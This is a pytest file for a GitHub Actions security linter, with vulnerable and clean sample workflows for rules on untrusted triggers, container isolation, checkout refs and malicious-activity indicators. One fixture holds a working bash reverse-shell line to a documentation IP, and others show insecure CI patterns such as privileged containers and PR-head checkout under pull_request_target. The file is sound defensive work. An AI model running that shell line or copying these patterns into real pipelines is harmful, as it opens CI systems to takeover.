"""Per-rule tests for GitHub Actions advanced-trigger and threat
rules:
GHA-009 (workflow_run downloads upstream artifact unverified),
GHA-013 (issue_comment trigger without author guard),
GHA-026 (container job disables isolation via options:),
GHA-027 (workflow contains malicious-activity indicators),
GHA-032 (run: invokes local script on untrusted-trigger workflow),
GHA-044 (build tool runs lifecycle scripts on untrusted-trigger workflow),
GHA-045 (caller-controlled ref input feeds actions/checkout),
GHA-046 (manual PR-head fetch on untrusted-trigger workflow).

GHA-009 / GHA-032 / GHA-044 / GHA-046 close the privileged-context
PPE surface that ``pull_request_target`` and ``workflow_run`` open.
GHA-045 closes the caller-ref variant for ``workflow_dispatch`` /
``workflow_call``. GHA-013 covers the ``issue_comment`` trigger that
GHA-002 doesn't (different event shape). GHA-026 catches container-
isolation breakage that the ``container.options:`` passthrough
enables. GHA-027 is the threat-indicator catch-all (reverse shells,
miners, exfil, audit erasure).
"""
from __future__ import annotations

from .conftest import run_check

# ── GHA-009 workflow_run artifact verification ──────────────────────


class TestGHA009WorkflowRunArtifact:
    def test_fails_when_workflow_run_downloads_artifact_without_verify(self):
        wf = """
        name: privileged-consume
        on:
          workflow_run:
            workflows: ['ci']
            types: [completed]
        jobs:
          consume:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/download-artifact@a3f9f8eedb3f6e3e3a09f4f4aaf0d7d1f5c4f4e3
                with: { name: build-output }
              - run: ./run-binary
        """
        f = run_check(wf, "GHA-009")
        assert not f.passed

    def test_passes_with_cosign_verify_attestation(self):
        wf = """
        name: privileged-consume
        on:
          workflow_run:
            workflows: ['ci']
            types: [completed]
        jobs:
          consume:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/download-artifact@a3f9f8eedb3f6e3e3a09f4f4aaf0d7d1f5c4f4e3
                with: { name: build-output }
              - run: cosign verify-attestation --type slsaprovenance ./artifact
              - run: ./run-binary
        """
        f = run_check(wf, "GHA-009")
        assert f.passed

    def test_passes_when_workflow_run_does_not_download_artifact(self):
        wf = """
        name: ping-only
        on:
          workflow_run:
            workflows: ['ci']
            types: [completed]
        jobs:
          ping:
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: echo done
        """
        f = run_check(wf, "GHA-009")
        assert f.passed

    def test_passes_when_trigger_is_not_workflow_run(self):
        wf = """
        name: pr-ci
        on: pull_request
        jobs:
          test:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps: [ { run: pytest } ]
        """
        f = run_check(wf, "GHA-009")
        assert f.passed


# ── GHA-013 issue_comment author guard ──────────────────────────────


class TestGHA013IssueCommentGuard:
    def test_fails_when_issue_comment_has_no_author_guard(self):
        wf = """
        name: comment-trigger
        on: issue_comment
        jobs:
          react:
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: echo "/${{ github.event.comment.body }}"
        """
        f = run_check(wf, "GHA-013")
        assert not f.passed

    def test_passes_with_author_association_guard(self):
        wf = """
        name: comment-trigger
        on: issue_comment
        jobs:
          react:
            if: contains('OWNER MEMBER COLLABORATOR', github.event.comment.author_association)
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: echo handled
        """
        f = run_check(wf, "GHA-013")
        assert f.passed

    def test_passes_with_actor_allowlist_guard(self):
        wf = """
        name: comment-trigger
        on: discussion_comment
        jobs:
          react:
            if: github.actor == 'release-bot'
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: echo handled
        """
        f = run_check(wf, "GHA-013")
        assert f.passed

    def test_passes_when_no_comment_trigger(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps: [ { run: make } ]
        """
        f = run_check(wf, "GHA-013")
        assert f.passed


# ── GHA-026 container job isolation ─────────────────────────────────


class TestGHA026ContainerEgress:
    def test_fails_on_privileged_container_options(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            container:
              image: node:20-alpine@sha256:0000000000000000000000000000000000000000000000000000000000000001
              options: --privileged --network host
            steps: [ { run: make } ]
        """
        f = run_check(wf, "GHA-026")
        assert not f.passed

    def test_fails_on_docker_socket_bind_mount_in_service(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            services:
              dind:
                image: docker:24-dind@sha256:0000000000000000000000000000000000000000000000000000000000000002
                options: -v /var/run/docker.sock:/var/run/docker.sock
            steps: [ { run: make } ]
        """
        f = run_check(wf, "GHA-026")
        assert not f.passed

    def test_passes_with_safe_options(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            container:
              image: node:20-alpine@sha256:0000000000000000000000000000000000000000000000000000000000000001
              options: --cpus=2 --memory=2g
            steps: [ { run: make } ]
        """
        f = run_check(wf, "GHA-026")
        assert f.passed

    def test_passes_when_no_container_block(self):
        wf = """
        name: ci
        on: push
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps: [ { run: make } ]
        """
        f = run_check(wf, "GHA-026")
        assert f.passed


# ── GHA-027 malicious-activity indicators ───────────────────────────


class TestGHA027MaliciousActivity:
    def test_fails_on_reverse_shell_run_step(self):
        wf = """
        name: ci
        on: push
        jobs:
          ship:
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: bash -i >& /dev/tcp/198.51.100.7/4444 0>&1
        """
        f = run_check(wf, "GHA-027")
        assert not f.passed

    def test_passes_on_clean_workflow(self):
        wf = """
        name: ci
        on: push
        jobs:
          test:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps: [ { run: pytest } ]
        """
        f = run_check(wf, "GHA-027")
        assert f.passed


# ── GHA-032 run: invoking local script under untrusted trigger ──────


class TestGHA032IndirectPPE:
    def test_fails_when_pull_request_target_runs_local_script(self):
        wf = """
        name: pr-build
        on: pull_request_target
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
                with: { ref: '${{ github.event.pull_request.head.sha }}' }
              - run: ./scripts/build.sh
        """
        f = run_check(wf, "GHA-032")
        assert not f.passed

    def test_fails_when_workflow_run_runs_bash_local_script(self):
        wf = """
        name: build-on-completed
        on:
          workflow_run:
            workflows: ['ci']
            types: [completed]
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
              - run: bash scripts/build.sh
        """
        f = run_check(wf, "GHA-032")
        assert not f.passed

    def test_passes_when_inline_shell_only(self):
        wf = """
        name: pr-lint
        on: pull_request_target
        jobs:
          lint:
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: echo no checkout, no script invocation
        """
        f = run_check(wf, "GHA-032")
        assert f.passed

    def test_passes_when_trigger_is_trusted(self):
        wf = """
        name: release
        on:
          push:
            branches: [main]
        jobs:
          ship:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
              - run: ./scripts/release.sh
        """
        f = run_check(wf, "GHA-032")
        assert f.passed


# ── GHA-044 build tool runs lifecycle scripts on untrusted trigger ──


class TestGHA044BuildToolPPE:
    def test_fails_on_npm_install_under_pull_request_target(self):
        wf = """
        name: pr-build
        on: pull_request_target
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
                with: { ref: '${{ github.event.pull_request.head.sha }}' }
              - run: npm install
        """
        f = run_check(wf, "GHA-044")
        assert not f.passed
        assert "npm install" in f.description.lower()

    def test_fails_on_pip_install_local_under_workflow_run(self):
        wf = """
        name: build-after-ci
        on:
          workflow_run:
            workflows: ['ci']
            types: [completed]
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - run: pip install -e .
        """
        f = run_check(wf, "GHA-044")
        assert not f.passed

    def test_fails_on_make_target_under_untrusted_trigger(self):
        wf = """
        name: pr-test
        on: pull_request_target
        jobs:
          test:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - run: make test
        """
        f = run_check(wf, "GHA-044")
        assert not f.passed

    def test_fails_on_gradle_wrapper(self):
        wf = """
        name: pr-build
        on: pull_request_target
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - run: ./gradlew assemble
        """
        f = run_check(wf, "GHA-044")
        assert not f.passed

    def test_passes_when_trigger_is_trusted(self):
        wf = """
        name: release
        on:
          push: { branches: [main] }
        jobs:
          ship:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - run: npm install
              - run: make release
        """
        f = run_check(wf, "GHA-044")
        assert f.passed

    def test_passes_on_pip_install_requirements(self):
        """``pip install -r requirements.txt`` doesn't execute
        local setup.py, so it isn't a PPE primitive on its own."""
        wf = """
        name: pr-build
        on: pull_request_target
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - run: pip install -r requirements.txt
        """
        f = run_check(wf, "GHA-044")
        assert f.passed

    def test_passes_on_npm_run_lint(self):
        """``npm run <script>`` triggers the named script only; the
        rule narrows to install / ci / i which execute lifecycle
        hooks at install time."""
        wf = """
        name: pr-lint
        on: pull_request_target
        jobs:
          lint:
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: npm run lint
        """
        f = run_check(wf, "GHA-044")
        assert f.passed


# ── GHA-045 caller-controlled ref input feeds actions/checkout ──────


class TestGHA045CallerRefCheckout:
    def test_fails_when_workflow_dispatch_ref_drives_checkout(self):
        wf = """
        name: build
        on:
          workflow_dispatch:
            inputs:
              ref:
                required: true
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
                with:
                  ref: ${{ inputs.ref }}
        """
        f = run_check(wf, "GHA-045")
        assert not f.passed

    def test_fails_when_workflow_call_ref_drives_checkout(self):
        wf = """
        name: reusable-build
        on:
          workflow_call:
            inputs:
              source_ref:
                type: string
                required: true
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
                with:
                  ref: ${{ inputs.source_ref }}
        """
        f = run_check(wf, "GHA-045")
        assert not f.passed

    def test_passes_when_ref_is_hardcoded(self):
        wf = """
        name: build
        on:
          workflow_dispatch:
            inputs:
              tag:
                required: true
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
                with:
                  ref: refs/tags/v1.0.0
        """
        f = run_check(wf, "GHA-045")
        assert f.passed

    def test_passes_when_no_input_trigger(self):
        wf = """
        name: ci
        on: pull_request
        jobs:
          build:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
        """
        f = run_check(wf, "GHA-045")
        assert f.passed

    def test_passes_when_dispatch_has_no_checkout_ref(self):
        wf = """
        name: ops
        on:
          workflow_dispatch:
            inputs:
              env:
                required: true
        jobs:
          op:
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: echo "${{ inputs.env }}"
        """
        f = run_check(wf, "GHA-045")
        assert f.passed


# ── GHA-046 manual PR-head fetch on untrusted-trigger workflow ──────


class TestGHA046ManualPRFetch:
    def test_fails_on_gh_pr_checkout(self):
        wf = """
        name: pr-test
        on: pull_request_target
        jobs:
          test:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
              - run: gh pr checkout ${{ github.event.number }}
                env: { GH_TOKEN: '${{ github.token }}' }
        """
        f = run_check(wf, "GHA-046")
        assert not f.passed

    def test_fails_on_git_fetch_pull_head(self):
        wf = """
        name: pr-test
        on: pull_request_target
        jobs:
          test:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
              - run: git fetch origin pull/123/head
        """
        f = run_check(wf, "GHA-046")
        assert not f.passed

    def test_fails_on_git_checkout_pr_sha_expression(self):
        wf = """
        name: pr-test
        on:
          workflow_run:
            workflows: ['ci']
            types: [completed]
        jobs:
          test:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
              - run: git checkout ${{ github.event.workflow_run.head_sha }}
        """
        f = run_check(wf, "GHA-046")
        assert not f.passed

    def test_fails_on_fetch_head_after_pull_fetch(self):
        wf = """
        name: pr-test
        on: pull_request_target
        jobs:
          test:
            runs-on: ubuntu-22.04
            timeout-minutes: 10
            permissions: { contents: read }
            steps:
              - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29
              - run: |
                  git fetch origin pull/42/head
                  git checkout FETCH_HEAD
        """
        f = run_check(wf, "GHA-046")
        assert not f.passed

    def test_passes_when_trigger_is_trusted(self):
        wf = """
        name: backport
        on:
          push: { branches: [main] }
        jobs:
          backport:
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: gh pr checkout 123
        """
        f = run_check(wf, "GHA-046")
        assert f.passed

    def test_passes_on_bare_fetch_head_checkout(self):
        """``git checkout FETCH_HEAD`` alone (no preceding pull/<N>
        fetch in the same run block) is ambiguous, so the rule
        doesn't fire."""
        wf = """
        name: pr-test
        on: pull_request_target
        jobs:
          test:
            runs-on: ubuntu-22.04
            timeout-minutes: 5
            permissions: { contents: read }
            steps:
              - run: |
                  git fetch origin main
                  git checkout FETCH_HEAD
        """
        f = run_check(wf, "GHA-046")
        assert f.passed
